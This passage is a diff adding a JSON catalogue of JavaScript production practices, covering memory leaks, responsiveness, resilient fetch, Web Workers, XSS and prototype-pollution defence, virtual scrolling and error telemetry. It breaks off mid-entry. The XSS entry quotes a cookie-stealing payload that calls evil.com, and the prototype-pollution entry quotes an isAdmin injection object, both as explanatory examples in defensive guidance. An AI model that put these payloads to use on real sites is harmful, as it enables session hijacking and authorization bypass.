@@ -1,0 +1,302 @@
+[
+  {
+    "id": "js-prod-01",
+    "topic": "Memory Leak Defense in Long-Running Single-Page Applications (SPA)",
+    "category": "Memory & Resilience",
+    "severity": "Critical / Browser Tab Crash",
+    "theProblem": "In single-page applications (SPAs) like dashboard monitors, trading desks, or enterprise SaaS portals, users keep tabs open for days. If unmounted components leave dangling event listeners on `window`, un-cleared `setInterval` timers, or references in global caches, entire detached DOM trees and component state remain permanently pinned in memory. The browser tab's heap gradually swells from 50MB to 2GB until the browser forcibly kills the tab with 'Out of Memory' (STATUS_BREAKPOINT / Aw, Snap!).",
+    "howItWorksInternally": "Garbage collection in V8 relies on reachability from GC Roots (the Global Object, the active Call Stack, and live DOM trees). When a DOM node is removed from the document (`element.remove()`), it is eligible for GC UNLESS a JavaScript variable, global event listener, or closure retains a reference to it. Furthermore, because DOM nodes maintain bidirectional links to their parent and sibling nodes, retaining a reference to a single `<td>` cell keeps the entire `<table>` and all 50,000 descendant elements pinned in heap memory. In V8 Heap Snapshots, these appear as 'Detached HTMLDivElement' (colored red/yellow).",
+    "productionCode": "// Production Pattern: Auto-cleaning Disposable Lifecycle Manager\nclass LifecycleRegistry {\n  constructor() {\n    this._disposables = new Set();\n  }\n\n  // 1. Safe Event Listener with automatic detachment\n  addEventListener(target, type, handler, options) {\n    target.addEventListener(type, handler, options);\n    const cleanup = () => target.removeEventListener(type, handler, options);\n    this._disposables.add(cleanup);\n    return cleanup;\n  }\n\n  // 2. Safe Interval with automatic cancellation\n  setInterval(callback, ms) {\n    const id = setInterval(callback, ms);\n    const cleanup = () => clearInterval(id);\n    this._disposables.add(cleanup);\n    return cleanup;\n  }\n\n  // 3. Safe AbortController tied to lifecycle\n  createAbortController() {\n    const controller = new AbortController();\n    this._disposables.add(() => controller.abort());\n    return controller;\n  }\n\n  // Tear down all listeners, timers, and abort in-flight requests simultaneously!\n  dispose() {\n    for (const cleanup of this._disposables) {\n      try {\n        cleanup();\n      } catch (err) {\n        console.error(\"Error during lifecycle disposal:\", err);\n      }\n    }\n    this._disposables.clear();\n  }\n}\n\n// React / Vanilla Component Lifecycle Usage:\nfunction mountDashboardWidget(container) {\n  const lifecycle = new LifecycleRegistry();\n\n  // Listeners and timers registered through manager\n  lifecycle.addEventListener(window, \"resize\", () => {\n    console.log(\"Window resized\");\n  }, { passive: true });\n\n  lifecycle.setInterval(() => {\n    console.log(\"Heartbeat telemetry\");\n  }, 5000);\n\n  // Return teardown function for unmount:\n  return function unmount() {\n    container.remove();\n    lifecycle.dispose(); // 100% clean teardown! No memory leaks!\n  };\n}",
+    "monitoringMetrics": [
+      "performance.memory.usedJSHeapSize > 350MB [Severity: High]",
+      "Delta Heap growth after 20 route transitions > 50MB [Severity: Critical]",
+      "Detached DOM Nodes count in heap snapshot > 100 nodes [Severity: High]",
+      "Active Window event listeners count > 50 [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "Every `addEventListener` on `window`, `document`, or parent containers MUST have a matching `removeEventListener` in unmount/teardown.",
+      "All `setInterval` and `setTimeout` timers MUST be cleared using `clearInterval`/`clearTimeout` on component destruction.",
+      "Global pub-sub event buses (e.g. EventEmitter) MUST unsubscribe listeners on view destroy to prevent closure retention.",
+      "Use WeakMap instead of Map when caching metadata associated with DOM elements.",
+      "Take 3-step Heap Snapshots in Chrome DevTools (baseline -> navigate -> return) and inspect 'Objects allocated between snapshots'."
+    ]
+  },
+  {
+    "id": "js-prod-02",
+    "topic": "Core Web Vitals INP (Interaction to Next Paint) & Long Task Slicing",
+    "category": "Performance & Responsiveness",
+    "severity": "Critical / SEO Penalty & UI Freeze",
+    "theProblem": "Google's Core Web Vitals metric INP (Interaction to Next Paint) measures page responsiveness to user interactions (clicks, keyboard presses, taps). If an event handler executes a synchronous operation taking > 50ms (a Long Task), the browser's single-threaded event loop is completely blocked: click animations freeze, input text stops typing, and Google flags the site with poor INP scores (> 200ms), resulting in severe SEO ranking penalties.",
+    "howItWorksInternally": "When JavaScript executes a synchronous block of code on the main thread, the browser cannot run layout, recalculate styles, rasterize pixels, or process the OS event queue. The browser compositor thread queues user clicks and keystrokes until the current JavaScript call stack unwinds completely. If a task executes for 250ms, the user experiences a 250ms delay before the browser can render visual feedback (such as a pressed button state or typing cursor), destroying the INP score.",
+    "productionCode": "// Production Time-Slicing Scheduler with scheduler.yield() and MessageChannel fallback\nclass TaskScheduler {\n  // Yield thread back to browser compositor\n  static yieldToMain() {\n    if (globalThis.scheduler?.yield) {\n      return globalThis.scheduler.yield(); // Native Chrome 115+ scheduler API\n    }\n    // Fallback: MessageChannel queues macrotask without 4ms timer clamp\n    return new Promise(resolve => {\n      const { port1, port2 } = new MessageChannel();\n      port1.onmessage = resolve;\n      port2.postMessage(null);\n    });\n  }\n\n  // Chunk array processing into 8ms slices (safely within 16.6ms frame budget)\n  static async chunkedProcess(items, processFn, maxTimePerSliceMs = 8) {\n    let deadline = performance.now() + maxTimePerSliceMs;\n\n    for (let i = 0; i < items.length; i++) {\n      processFn(items[i], i);\n\n      // If slice budget is exhausted, yield main thread to let browser handle clicks and paint!\n      if (performance.now() >= deadline) {\n        await this.yieldToMain();\n        deadline = performance.now() + maxTimePerSliceMs; // Reset budget\n      }\n    }\n  }\n}\n\n// Production Usage: Process 50,000 data items without blocking UI clicks\nasync function handleFilterChange(rawRecords) {\n  showSpinner();\n\n  const filtered = [];\n  await TaskScheduler.chunkedProcess(rawRecords, (item) => {\n    if (item.active && item.score > 80) filtered.push(item);\n  });\n\n  renderTable(filtered);\n  hideSpinner();\n}",
+    "monitoringMetrics": [
+      "Core Web Vitals INP (Interaction to Next Paint) > 200ms [Severity: High]",
+      "Long Tasks (> 50ms duration) via PerformanceObserver [Severity: High]",
+      "Total Blocking Time (TBT) > 300ms on initial load [Severity: High]",
+      "Main thread utilization during user interactions > 85% [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "Any synchronous data processing loop exceeding 1,000 items MUST be chunked using `scheduler.yield()` or `MessageChannel`.",
+      "Heavy JSON parsing of large API payloads (> 1MB) MUST be offloaded to Web Workers.",
+      "Measure Long Tasks in production using `new PerformanceObserver(list => ...).observe({ type: 'longtask', buffered: true })`.",
+      "Provide immediate visual feedback (e.g. optimistic UI, disabled button state) within 16ms before initiating heavy background processing.",
+      "Keep all user interaction event handlers strictly under 50ms total execution time."
+    ]
+  },
+  {
+    "id": "js-prod-03",
+    "topic": "Resilient Client-Side Network Layer (Timeouts, AbortSignal, & Jittered Backoff)",
+    "category": "Networking & Reliability",
+    "severity": "Critical / Data Inconsistency & API Failures",
+    "theProblem": "Native `fetch()` does not have a default timeout; if a backend server hangs or drops packets, a fetch request will hang indefinitely in the browser, holding open sockets and exhausting browser connection pools. Furthermore, naive retry loops without exponential backoff and randomized jitter bombard recovering backend services with synchronized retry storms (the 'Thundering Herd' problem), turning brief outages into permanent cascade crashes.",
+    "howItWorksInternally": "Browsers enforce a strict limit of 6 simultaneous HTTP/1.1 TCP connections per origin. If 6 fetch requests hang indefinitely without timeouts, all subsequent fetch calls to that domain are queued in browser memory forever. When network connections drop and reconnect, thousands of client tabs retry simultaneously at fixed intervals (e.g. exactly 1000ms), creating massive traffic spikes at second 1, second 2, second 3. Full Jitter randomly distributes retry attempts across time intervals to flatten traffic spikes.",
+    "productionCode": "// Production Resilient Fetch Layer with AbortSignal.any, Timeout, and Full Jitter\nclass ResilientHttpClient {\n  static async request(url, options = {}) {\n    const {\n      timeoutMs = 8000,\n      retries = 3,\n      initialBackoffMs = 200,\n      maxBackoffMs = 4000,\n      signal: userSignal,\n      ...fetchOptions\n    } = options;\n\n    let attempt = 0;\n\n    while (true) {\n      attempt++;\n      // Create timeout signal and combine with user signal (ES2024 AbortSignal.any)\n      const timeoutSignal = AbortSignal.timeout(timeoutMs);\n      const combinedSignal = userSignal\n        ? AbortSignal.any([userSignal, timeoutSignal])\n        : timeoutSignal;\n\n      try {\n        const response = await fetch(url, { ...fetchOptions, signal: combinedSignal });\n\n        // Throw for 5xx server errors to trigger retry; 4xx client errors should fail fast\n        if (response.status >= 500 && attempt <= retries) {\n          throw new Error(`Server error HTTP ${response.status}`);\n        }\n\n        return response;\n      } catch (err) {\n        // If user explicitly cancelled request, abort immediately without retrying!\n        if (userSignal?.aborted) {\n          throw new DOMException(\"Request aborted by user\", \"AbortError\");\n        }\n\n        if (attempt > retries) {\n          const isTimeout = timeoutSignal.aborted;\n          throw new Error(isTimeout ? `Request timed out after ${timeoutMs}ms` : err.message);\n        }\n\n        // Full Jitter Formula: delay = random(0, min(maxBackoff, initialBackoff * 2^attempt))\n        const calculatedBackoff = Math.min(maxBackoffMs, initialBackoffMs * Math.pow(2, attempt));\n        const jitteredDelay = Math.floor(Math.random() * calculatedBackoff);\n\n        console.warn(`[Network Retry] Attempt ${attempt} failed: ${err.message}. Retrying in ${jitteredDelay}ms...`);\n        await new Promise(r => setTimeout(r, jitteredDelay));\n      }\n    }\n  }\n}",
+    "monitoringMetrics": [
+      "Client network request timeout rate > 2% [Severity: High]",
+      "5xx server error retry exhaustion rate > 1% [Severity: Critical]",
+      "Average HTTP request latency > 1500ms [Severity: Medium]",
+      "In-flight pending network requests count > 12 [Severity: High]"
+    ],
+    "productionChecklist": [
+      "Every single `fetch()` call MUST have an explicit `AbortSignal.timeout(ms)` to prevent hanging sockets.",
+      "Retry algorithms MUST implement randomized jitter to prevent synchronized thundering herd spikes.",
+      "Never retry 4xx HTTP client errors (400, 401, 403, 404, 422) as they represent invalid payloads or auth failures.",
+      "If user navigates away from the page, cancel in-flight requests immediately using `controller.abort()`.",
+      "Ensure idempotent POST/PUT requests include unique `Idempotency-Key` headers."
+    ]
+  },
+  {
+    "id": "js-prod-04",
+    "topic": "Offloading Heavy CPU Workloads to Web Workers via Structured Cloning & Transferables",
+    "category": "Concurrency & Performance",
+    "severity": "High / Main Thread Lockup",
+    "theProblem": "Running complex client-side calculations (cryptographic hashing, client-side CSV/Excel export generation, image manipulation, audio analysis, or large syntax highlighting) directly on the main thread locks up the browser completely. The UI stops responding to user mouse gestures, CSS transitions stutter, and mobile browsers trigger 'Page Unresponsive' modal dialogs.",
+    "howItWorksInternally": "JavaScript execution on the main UI thread competes directly with the browser's layout, style recalculation, and rendering engine. Web Workers run in dedicated background OS threads with their own isolated V8 Isolate and memory heap. Data passed between threads using `postMessage` is serialized via the HTML5 Structured Clone Algorithm. For large binary buffers (e.g. 50MB files or canvas pixels), transferring memory ownership using **Transferable Objects** swaps underlying memory pointers in $O(1)$ time with 0ms copying latency, neutering the sender's buffer.",
+    "productionCode": "// Production Web Worker Bridge with Promise RPC and Transferable Support\nclass WorkerRpcClient {\n  constructor(workerScriptUrl) {\n    this.worker = new Worker(workerScriptUrl);\n    this.pendingRequests = new Map();\n    this.requestId = 0;\n\n    this.worker.onmessage = (event) => {\n      const { id, result, error } = event.data;\n      const resolver = this.pendingRequests.get(id);\n      if (!resolver) return;\n\n      this.pendingRequests.delete(id);\n      if (error) {\n        resolver.reject(new Error(error));\n      } else {\n        resolver.resolve(result);\n      }\n    };\n\n    this.worker.onerror = (err) => {\n      console.error(\"Fatal Worker Thread Error:\", err.message);\n    };\n  }\n\n  // Execute remote task on worker thread returning Promise\n  execute(action, payload, transferables = []) {\n    const id = ++this.requestId;\n\n    return new Promise((resolve, reject) => {\n      this.pendingRequests.set(id, { resolve, reject });\n      // Pass transferables in 2nd argument array for zero-copy memory pointer transfer!\n      this.worker.postMessage({ id, action, payload }, transferables);\n    });\n  }\n\n  terminate() {\n    this.worker.terminate();\n    this.pendingRequests.forEach(({ reject }) => reject(new Error(\"Worker terminated\")));\n    this.pendingRequests.clear();\n  }\n}\n\n// Production Usage:\n// const client = new WorkerRpcClient(\"/workers/dataProcessor.js\");\n// const largeBuffer = new ArrayBuffer(50 * 1024 * 1024); // 50MB\n// const processed = await client.execute(\"PROCESS_DATA\", largeBuffer, [largeBuffer]);",
+    "monitoringMetrics": [
+      "Main thread CPU execution duration during data processing > 50ms [Severity: High]",
+      "Worker thread processing latency P95 > 2000ms [Severity: Medium]",
+      "Memory transfer duration using postMessage > 10ms [Severity: Medium]",
+      "Active Web Worker thread count > os.hardwareConcurrency [Severity: High]"
+    ],
+    "productionChecklist": [
+      "Any computation running for longer than 30ms MUST be moved to a Web Worker.",
+      "Large binary buffers (`ArrayBuffer`, `ImageBitmap`) MUST be passed in the transfer list `postMessage(data, [data])` for zero-copy speed.",
+      "Always implement a Promise RPC request/response protocol with unique message IDs to correlate asynchronous worker results.",
+      "Handle `worker.onerror` globally to catch unhandled exceptions inside the worker thread.",
+      "Terminate workers when views unmount to prevent background memory leakage."
+    ]
+  },
+  {
+    "id": "js-prod-05",
+    "topic": "Cross-Site Scripting (XSS) & DOM-Based Injection Defense-in-Depth",
+    "category": "Security & Hardening",
+    "severity": "Critical / Account Takeover & Session Hijacking",
+    "theProblem": "DOM-based Cross-Site Scripting (DOM XSS) occurs when untrusted user input is passed into unsafe execution sinks such as `innerHTML`, `document.write`, `outerHTML`, or `eval()`. An attacker who injects `<img src=x onerror=fetch('https://evil.com/steal?cookie='+document.cookie)>` can steal session tokens, manipulate financial transactions, or hijack active user sessions completely.",
+    "howItWorksInternally": "When user input containing HTML tags is assigned to `element.innerHTML`, the browser's HTML parser parses and executes embedded script tags and inline event handlers (`onerror`, `onload`, `onmouseover`). Even if `<script>` tags are blocked by modern frameworks, inline event handlers on image or SVG tags execute immediately. Defense-in-depth requires: 1) Using `textContent` for plain text, 2) Sanitizing HTML with DOMPurify, 3) Enforcing Trusted Types API, and 4) Strict Content Security Policy (CSP).",
+    "productionCode": "// Production HTML Sanitization & Trusted Types Pipeline\nclass SecureDomSanitizer {\n  // 1. Safe text insertion: textContent treats strings as raw text, never HTML!\n  static setText(element, unsafeString) {\n    element.textContent = unsafeString;\n  }\n\n  // 2. Hardened HTML sanitization using DOMPurify with strict whitelist\n  static sanitizeHtml(dirtyHtml) {\n    if (typeof DOMPurify === \"undefined\") {\n      throw new Error(\"DOMPurify library must be loaded for HTML sanitization\");\n    }\n\n    return DOMPurify.sanitize(dirtyHtml, {\n      ALLOWED_TAGS: [\"b\", \"i\", \"em\", \"strong\", \"a\", \"p\", \"ul\", \"li\", \"span\"],\n      ALLOWED_ATTR: [\"href\", \"title\", \"target\", \"rel\", \"class\"],\n      ALLOW_DATA_ATTR: false, // Disallow data-* attribute injections\n      ADD_ATTR: [\"target\", \"rel\"], // Force safe external link attributes\n      FORBID_TAGS: [\"style\", \"script\", \"iframe\", \"object\", \"embed\", \"svg\"],\n      FORBID_ATTR: [\"onerror\", \"onload\", \"onclick\", \"onmouseover\"]\n    });\n  }\n\n  // 3. Safe innerHTML assignment using Trusted Types\n  static setHtml(element, dirtyHtml) {\n    const cleanHtml = this.sanitizeHtml(dirtyHtml);\n\n    // Enforce safe target and rel='noopener noreferrer' on all links\n    element.innerHTML = cleanHtml;\n    element.querySelectorAll(\"a\").forEach(a => {\n      a.setAttribute(\"rel\", \"noopener noreferrer\");\n      if (a.hostname !== window.location.hostname) {\n        a.setAttribute(\"target\", \"_blank\");\n      }\n    });\n  }\n}",
+    "monitoringMetrics": [
+      "CSP (Content Security Policy) violation reports count > 0 [Severity: Critical]",
+      "DOMPurify stripped malicious elements count > 0 [Severity: High]",
+      "Usage of unsafe sinks (innerHTML, eval, document.write) in codebase [Severity: High]"
+    ],
+    "productionChecklist": [
+      "NEVER assign raw user input to `element.innerHTML`, `outerHTML`, or jQuery `$()`. Use `textContent`.",
+      "If rendering rich text/HTML is required, ALWAYS sanitize using `DOMPurify.sanitize()`.",
+      "Deploy a strict Content-Security-Policy (CSP) header: `default-src 'self'; script-src 'self'; object-src 'none';`.",
+      "Always set `rel='noopener noreferrer'` on links with `target='_blank'` to prevent reverse tab-nabbing.",
+      "Store authentication tokens in `HttpOnly; Secure; SameSite=Strict` cookies, NEVER in `localStorage` or `sessionStorage`."
+    ]
+  },
+  {
+    "id": "js-prod-06",
+    "topic": "Prototype Pollution Prevention in Client-Side State Deserialization",
+    "category": "Security & Hardening",
+    "severity": "Critical / Remote Code Execution & Auth Bypass",
+    "theProblem": "When receiving JSON payloads from WebSockets, external APIs, or query parameters, recursive deep-merge or object-assign functions can be tricked into writing properties onto `Object.prototype` (via keys like `__proto__`, `constructor`, `prototype`). Because every object in JavaScript inherits from `Object.prototype`, polluting the global prototype modifies behavior across the entire runtime, leading to authentication bypasses, unexpected logic paths, or client crashes.",
+    "howItWorksInternally": "JavaScript's prototypal inheritance looks up properties up the chain: `obj -> Object.prototype -> null`. If an attacker submits a payload `{ \"__proto__\": { \"isAdmin\": true, \"debugMode\": true } }`, an insecure recursive merge evaluates `target['__proto__']['isAdmin'] = true`. Because `target.__proto__` points to the shared `Object.prototype`, suddenly `({}).isAdmin === true` everywhere in the application, subverting security checks.",
+    "productionCode": "// Production Safe Deep Merge & JSON Parser with Prototype Pollution Shields\nclass SafeObjectOperations {\n  // 1. Safe JSON parser with key reviver\n  static parseSafeJson(jsonString) {\n    return JSON.parse(jsonString, (key, value) => {\n      // Strip dangerous prototype mutation keys during parsing!\n      if (key === \"__proto__\" || key === \"constructor\" || key === \"prototype\") {\n        console.warn(`[Security Alert] Prototype pollution key dropped: '${key}'`);\n        return undefined; // Discard property completely\n      }\n      return value;\n    });\n  }\n\n  // 2. Hardened Deep Merge with explicit prototype boundary guards\n  static deepMerge(target, source) {\n    if (!target || typeof target !== \"object\") return source;\n    if (!source || typeof source !== \"object\") return target;\n\n    for (const key of Object.keys(source)) {\n      // SHIELD 1: Explicitly reject prototype pollution keys\n      if (key === \"__proto__\" || key === \"constructor\" || key === \"prototype\") {\n        continue;\n      }\n\n      const sourceVal = source[key];\n      const targetVal = target[key];\n\n      if (Array.isArray(sourceVal)) {\n        target[key] = [...sourceVal];\n      } else if (sourceVal !== null && typeof sourceVal === \"object\") {\n        if (!targetVal || typeof targetVal !== \"object\") {\n          // SHIELD 2: Use null-prototype dictionary for nested branches\n          target[key] = Object.create(null);\n        }\n        this.deepMerge(target[key], sourceVal);\n      } else {\n        target[key] = sourceVal;\n      }\n    }\n\n    return target;\n  }\n}",
+    "monitoringMetrics": [
+      "Attempted prototype pollution detections count > 0 [Severity: Critical]",
+      "Object.prototype modified properties count > 0 [Severity: Critical]",
+      "JSON parsing exceptions on external payloads > 10 [Severity: Medium]"
+    ],
+    "productionChecklist": [
+      "In deep-merge, deep-clone, and query-string parsing libraries, ALWAYS block `__proto__`, `constructor`, and `prototype` keys.",
+      "Use `Object.create(null)` or `new Map()` for dynamic dictionary hash-maps that store user-provided keys.",
+      "Freeze the root prototype in security-sensitive applications: `Object.freeze(Object.prototype)`.",
+      "Use `Object.hasOwn(obj, prop)` instead of `obj.hasOwnProperty(prop)` to prevent shadowed method attacks.",
+      "Audit npm dependencies for known prototype pollution CVEs using `npm audit`."
+    ]
+  },
+  {
+    "id": "js-prod-07",
+    "topic": "Virtual Scrolling & Windowing for High-Density Datasets (100k+ Rows)",
+    "category": "Performance & UI Scaling",
+    "severity": "High / DOM Memory Bloat & Render Jank",
+    "theProblem": "Rendering a dataset with 50,000 table rows or feed cards creates 50,000 DOM elements with 500,000+ child nodes. The browser runs out of memory, layout recalculations take seconds, and scrolling stutters at < 10fps. Users on laptops and mobile devices experience browser tab crashes due to excessive DOM memory allocation.",
+    "howItWorksInternally": "Every DOM node costs ~2KB–4KB of native C++ memory inside the browser engine, plus layout nodes and styling trees. Virtual scrolling solves this by calculating the scroll offset (`scrollTop`), determining which 15–20 items are currently within the visible viewport, and rendering ONLY those visible items. Absolute positioning or dynamic top/bottom padding maintains the illusion of a massive scrollbar height ($totalItems \\times itemHeight$).",
+    "productionCode": "// Production Virtual List Controller (Zero Dependencies)\nclass VirtualListScroller {\n  constructor(options) {\n    this.container = options.container; // Scrollable DOM container\n    this.totalItems = options.totalItems;\n    this.itemHeight = options.itemHeight; // Fixed height in px\n    this.renderRow = options.renderRow; // (index) => DOM element\n    this.buffer = options.buffer || 3; // Buffer items above & below viewport\n\n    this._initDom();\n    this._attachScrollListener();\n    this.render();\n  }\n\n  _initDom() {\n    this.container.style.position = \"relative\";\n    this.container.style.overflowY = \"auto\";\n\n    // Spacer element to create the massive native scrollbar\n    this.spacer = document.createElement(\"div\");\n    this.spacer.style.height = `${this.totalItems * this.itemHeight}px`;\n    this.spacer.style.width = \"100%\";\n    this.spacer.style.position = \"absolute\";\n    this.spacer.style.top = \"0\";\n    this.spacer.style.left = \"0\";\n\n    // Content container holding only visible DOM elements\n    this.content = document.createElement(\"div\");\n    this.content.style.position = \"absolute\";\n    this.content.style.width = \"100%\";\n    this.content.style.top = \"0\";\n    this.content.style.left = \"0\";\n\n    this.container.appendChild(this.spacer);\n    this.container.appendChild(this.content);\n  }\n\n  _attachScrollListener() {\n    let ticking = false;\n    this.container.addEventListener(\"scroll\", () => {\n      if (!ticking) {\n        requestAnimationFrame(() => {\n          this.render();\n          ticking = false;\n        });\n        ticking = true;\n      }\n    }, { passive: true });\n  }\n\n  render() {\n    const scrollTop = this.container.scrollTop;\n    const viewportHeight = this.container.clientHeight;\n\n    // Calculate window slice:\n    const rawStart = Math.floor(scrollTop / this.itemHeight);\n    const visibleCount = Math.ceil(viewportHeight / this.itemHeight);\n\n    const startIndex = Math.max(0, rawStart - this.buffer);\n    const endIndex = Math.min(this.totalItems - 1, rawStart + visibleCount + this.buffer);\n\n    // Position content container at correct vertical offset\n    const offsetY = startIndex * this.itemHeight;\n    this.content.style.transform = `translateY(${offsetY}px)`;\n\n    // Render only visible rows:\n    this.content.innerHTML = \"\";\n    for (let i = startIndex; i <= endIndex; i++) {\n      this.content.appendChild(this.renderRow(i));\n    }\n  }\n}",
+    "monitoringMetrics": [
+      "Total active DOM nodes count on page > 3,000 nodes [Severity: High]",
+      "Scroll event frame rate < 55fps during scrolling [Severity: High]",
+      "Virtual list render latency per frame > 8ms [Severity: Medium]",
+      "DOM memory usage > 100MB [Severity: High]"
+    ],
+    "productionChecklist": [
+      "Never render more than 50 visible DOM rows simultaneously in lists with > 1,000 items.",
+      "Scroll event listeners MUST use `requestAnimationFrame` debouncing and `{ passive: true }`.",
+      "Position virtual windows using GPU-accelerated `transform: translateY(px)` rather than modifying `top` (which triggers layout reflow).",
+      "Include a buffer of 2–5 rows above and below the viewport to prevent blank flashing during fast scrolling.",
+      "Measure total DOM nodes using `document.querySelectorAll('*').length` to enforce node budgets."
+    ]
+  },
+  {
+    "id": "js-prod-08",
+    "topic": "High-Frequency Event Optimization: RAF Throttling and Passive Listeners",
+    "category": "Performance & Responsiveness",
+    "severity": "High / Scroll Stutter & Mobile Battery Drain",
+    "theProblem": "High-frequency DOM events (`scroll`, `resize`, `mousemove`, `touchmove`) fire up to 120–240 times per second on high-refresh displays. If an event handler triggers DOM reads (`offsetTop`), state updates, or network calls on every event tick, the browser is overwhelmed with hundreds of execution frames per second, causing dropped frames, battery drain, and thermal throttling on mobile devices.",
+    "howItWorksInternally": "The browser display cannot show more updates than the monitor's physical refresh rate (60Hz = once every 16.6ms). Firing JavaScript calculations 240 times per second calculates 3 redundant intermediate states that are discarded before the next display paint. By combining `{ passive: true }` (allowing immediate off-thread compositor scrolling) and `requestAnimationFrame` throttling, execution is synchronized perfectly to 1 execution per display frame.",
+    "productionCode": "// Production High-Frequency Event Throttling Engine\nclass EventOptimizer {\n  // Throttle callback to at most ONCE per display refresh frame using rAF\n  static rafThrottle(fn) {\n    let isScheduled = false;\n    let latestArgs = null;\n    let latestThis = null;\n\n    return function throttled(...args) {\n      latestArgs = args;\n      latestThis = this;\n\n      if (!isScheduled) {\n        isScheduled = true;\n        requestAnimationFrame(() => {\n          isScheduled = false;\n          fn.apply(latestThis, latestArgs);\n          latestArgs = latestThis = null;\n        });\n      }\n    };\n  }\n\n  // Attach high-performance passive scroll handler\n  static attachScrollTracker(element, onScrollCallback) {\n    const optimizedHandler = this.rafThrottle((event) => {\n      const scrollY = element === window ? window.scrollY : element.scrollTop;\n      onScrollCallback(scrollY, event);\n    });\n\n    // passive: true promises browser no preventDefault() will be called,\n    // allowing background compositor thread to scroll at 60-120fps instantly!\n    element.addEventListener(\"scroll\", optimizedHandler, { passive: true });\n\n    return () => element.removeEventListener(\"scroll\", optimizedHandler);\n  }\n}",
+    "monitoringMetrics": [
+      "Scroll event handlers execution duration per frame > 4ms [Severity: Medium]",
+      "Lighthouse audit: 'Does not use passive listeners to improve scrolling performance' [Severity: High]",
+      "Frame drop rate during scroll gestures > 5% [Severity: High]"
+    ],
+    "productionChecklist": [
+      "All `scroll`, `touchmove`, and `wheel` listeners MUST have `{ passive: true }` enabled.",
+      "Synchronize visual updates with monitor V-Sync using `requestAnimationFrame` throttling.",
+      "Never perform expensive DOM layout reads (`getBoundingClientRect()`, `offsetHeight`) directly inside raw event handlers.",
+      "Clean up all event listeners when components or pages unmount.",
+      "Verify 60fps scrolling on throttled mobile devices in Chrome DevTools Performance panel."
+    ]
+  },
+  {
+    "id": "js-prod-09",
+    "topic": "Global Unhandled Error Boundary & Telemetry Instrumentation",
+    "category": "Observability & Diagnostics",
+    "severity": "Critical / Silent Outages & Blind Spots",
+    "theProblem": "Asynchronous JavaScript errors (unhandled Promise rejections, uncaught exceptions inside `setTimeout`, network failures in background workers) fail silently without triggering UI error boundaries. Users experience frozen buttons or missing data, while engineering teams remain completely blind to client-side production outages until customer support tickets accumulate.",
+    "howItWorksInternally": "JavaScript provides two primary global error hooks: `window.onerror` (for synchronous runtime errors and script exceptions) and `window.addEventListener('unhandledrejection')` (for rejected Promises without `.catch()`). Modern error monitoring systems capture the error stack trace, user breadcrumbs, network request context, source map line mappings, and telemetry metadata, throttling error transmissions to prevent overloading telemetry ingestion endpoints.",
+    "productionCode": "// Production Client-Side Telemetry & Error Boundary Monitor\nclass GlobalErrorMonitor {\n  constructor(options = {}) {\n    this.endpoint = options.endpoint || \"/api/telemetry/errors\";\n    this.appVersion = options.appVersion || \"1.0.0\";\n    this.maxErrorsPerMinute = 10;\n    this.recentErrorsCount = 0;\n    this.breadcrumbs = [];\n\n    this._setupBreadcrumbTracking();\n    this._attachGlobalHandlers();\n  }\n\n  _setupBreadcrumbTracking() {\n    // Record user clicks and navigation as debugging breadcrumbs\n    window.addEventListener(\"click\", (e) => {\n      const target = e.target.closest(\"button, a, input\");\n      if (target) {\n        this.addBreadcrumb(`Click on <${target.tagName.toLowerCase()}> with text '${target.innerText?.slice(0, 20)}'`);\n      }\n    }, { passive: true, capture: true });\n  }\n\n  addBreadcrumb(message) {\n    this.breadcrumbs.push({ message, timestamp: Date.now() });\n    if (this.breadcrumbs.length > 20) this.breadcrumbs.shift(); // Keep last 20\n  }\n\n  _attachGlobalHandlers() {\n    // 1. Synchronous errors & script errors\n    window.onerror = (message, source, lineno, colno, error) => {\n      this._reportError({\n        type: \"UNCAUGHT_EXCEPTION\",\n        message: String(message),\n        stack: error?.stack,\n        location: `${source}:${lineno}:${colno}`\n      });\n      return false; // Let browser standard console logging proceed\n    };\n\n    // 2. Unhandled asynchronous Promise rejections\n    window.addEventListener(\"unhandledrejection\", (event) => {\n      this._reportError({\n        type: \"UNHANDLED_PROMISE_REJECTION\",\n        message: event.reason?.message || String(event.reason),\n        stack: event.reason?.stack\n      });\n    });\n  }\n\n  _reportError(errorPayload) {\n    if (this.recentErrorsCount >= this.maxErrorsPerMinute) return;\n    this.recentErrorsCount++;\n    setTimeout(() => this.recentErrorsCount--, 60000);\n\n    const payload = {\n      ...errorPayload,\n      appVersion: this.appVersion,\n      userAgent: navigator.userAgent,\n      url: window.location.href,\n      breadcrumbs: [...this.breadcrumbs],\n      timestamp: new Date().toISOString()\n    };\n\n    // Send via sendBeacon for reliable delivery even if user is closing the tab!\n    if (navigator.sendBeacon) {\n      navigator.sendBeacon(this.endpoint, JSON.stringify(payload));\n    } else {\n      fetch(this.endpoint, {\n        method: \"POST\",\n        body: JSON.stringify(payload),\n        headers: { \"Content-Type\": \"application/json\" },\n        keepalive: true\n      }).catch(() => {});\n    }\n  }\n}",
+    "monitoringMetrics": [
+      "Client error rate (errors per 1,000 page views) > 0.5% [Severity: High]",
+      "Unhandled Promise rejection rate > 0.1% [Severity: Critical]",
+      "Client telemetry ingestion latency > 200ms [Severity: Low]",
+      "Crash-free sessions rate < 99.8% [Severity: Critical]"
+    ],
+    "productionChecklist": [
+      "Instrument both `window.onerror` and `window.onunhandledrejection` at the very top of `<head>` before any scripts run.",
+      "Use `navigator.sendBeacon` or `fetch({ keepalive: true })` to guarantee error delivery during page unload/exit.",
+      "Rate-limit error transmissions to prevent infinite error loops from flooding backend logging endpoints.",
+      "Upload JavaScript source maps securely to monitoring servers (Sentry/Datadog) to de-minify production stack traces.",
+      "Sanitize sensitive user data (passwords, auth tokens, credit cards) from error breadcrumbs and payload strings."
+    ]
+  },
+  {
+    "id": "js-prod-10",
+    "topic": "Cross-Origin Isolation & SharedArrayBuffer Concurrency (COOP / COEP Architecture)",
+    "category": "Security & Concurrency",
+    "severity": "Critical / Security Vulnerability & Feature Deprecation",
+    "theProblem": "To enable high-performance multi-threaded features like `SharedArrayBuffer` and high-resolution timers (`performance.now()` with sub-millisecond precision), modern browsers require pages to be 'Cross-Origin Isolated'. Without specific security headers, `SharedArrayBuffer` is completely disabled by browser engines to prevent Spectre side-channel memory leaks, breaking multi-threaded WebAssembly and Web Worker pipelines.",
